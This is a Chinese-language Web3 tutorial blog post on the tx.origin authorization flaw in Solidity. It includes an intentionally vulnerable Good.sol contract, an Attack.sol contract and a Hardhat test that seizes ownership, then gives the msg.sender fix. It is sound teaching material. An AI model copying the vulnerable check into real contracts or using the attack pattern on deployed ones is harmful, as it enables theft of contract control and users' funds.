---
title: Web3系列教程之高级篇---8：为什么不要使用tx.origin来确定交易的发送者
description: null
author: 李留白
weight: 0
date: 2022-08-07T13:53:04.820Z
lastmod: 2022-08-07T13:53:13.101Z
tags: []
categories:
  - 区块链
  - WEB3.0
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/R3RYera.png
---

`tx.origin`是一个全局变量，用于返回创建原始交易的地址。它有点类似于`msg.sender`，但有一个重要的注意事项。我们将学习如何因为错误地使用`tx.origin`导致智能合约的安全漏洞。

开始吧🚀

## 什么是tx.origin?

`tx.origin`是一个全局变量，返回发送交易的账户地址。现在你可能想知道什么是`msg.sender` 🤔。区别在于，`tx.origin`指的是开始交易的原始外部账户（也就是用户），而`msg.sender`是调用函数的直接账户，它可以是一个外部账户或另一个调用函数的合约。

因此，例如，如果用户调用合约A，然后在同一交易中调用合约B，当从合约B内部检查时，`msg.sender`将等于合约A。然而，无论你从哪里检查，`tx.origin`将是用户。

## 对智能合约的DOS攻击

### 将会发生什么？

将有两个智能合约 - `Good.sol`和`Attack.sol`。`Good.sol`。最初，`Good.sol`的所有者将是一个好的用户。使用攻击功能`Attack.sol`将能够把`Good.sol`的所有者变为自己。

### 建造

让我们构建一个示例，您可以在其中体验攻击是如何发生的。

- 要设置一个Hardhat项目，请打开终端，在一个新的文件夹中执行这些命令

```bash
npm init --yes
npm install --save-dev hardhat
```

- 如果你不是在mac上，请做这个额外的步骤，也安装这些库 :)

```
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- 在你安装Hardhat的同一目录下运行。

```bash
npx hardhat
```

- 选择`Create a basic sample project`
- 对已指定的`Hardhat Project root`按回车键
- 如果你想添加一个`.gitignore`，请按回车键。
- 按回车键`Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

现在你有一个准备好的hardhat项目了!

首先，让我们创建一个名为`Good.sol`的合约，它基本上是我们之前使用过的`Ownable.sol`的一个简单版本。

```
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract Good  {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setOwner(address newOwner) public {
        require(tx.origin == owner, "Not owner" );
        owner = newOwner;
    }
}
```


现在，在`contracts`目录下创建一个名为`Attack.sol`的合约，并编写以下几行代码：

```
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good public good;
    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
```

现在，让我们尝试使用样本测试来模仿攻击，在`test`文件夹下创建一个名为`attack.js`的新文件，并在其中添加以下几行代码

```
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Attack.sol will be able to change the owner of Good.sol", async function () {
    // Get one address
    const [_, addr1] = await ethers.getSigners();

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.connect(addr1).deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    let tx = await _attackContract.connect(addr1).attack();
    await tx.wait();

    // Now lets check if the current owner of Good.sol is actually Attack.sol
    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
```

攻击会发生如下情况，最初`addr1`会部署`Good.sol`，并成为所有者，但攻击者会以某种方式愚弄拥有`addr1`私钥的用户，让他用`Attack.sol`调用`attack`函数。

当用户用`addr1`调用`attack`函数时，`tx.origin`被设置为`addr1`。`attack`函数进一步调用`Good.sol`的`setOwner`函数，首先检查`tx.origin`是否确实是所有者，这是真的，因为原始交易确实是由`addr1`调用的。在验证了所有者后，它将所有者设置为`Attack.sol`

因此，攻击者能够成功地改变`Good.sol `的所有者 🤯。

要运行测试，在你的终端上指向本级别的根目录，执行以下命令

```
npx hardhat test
```

当测试通过后，你会注意到`Good.sol`的所有者现在是`Attack.sol`。

## 现实生活中的例子

虽然这对你们中的大多数人来说可能是显而易见的，因为`tx.origin`根本不是你看到的被使用的东西，但有些开发者确实犯了这个错误。你可以在这里读到[THORChain Hack #2](https://rekt.news/thorchain-rekt2/)，由于攻击者能够通过向用户的钱包发送假的代币来获得对$RUNE代币的批准，而批准该代币在Uniswap上出售，就会将$RUNE从用户的钱包转移到攻击者的钱包，因为THORChain使用`tx.origin`而不是`msg.sender`进行转账检查。

## 预防

你应该使用`msg.sender`而不是`tx.origin`来避免这种情况发生。

例如：

```
function setOwner(address newOwner) public {
    require(msg.sender == owner, "Not owner" );
    owner = newOwner;
}
```

希望你喜欢本文❤️

## 参考

- [Solidity by example](https://solidity-by-example.org/)

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/my.png)
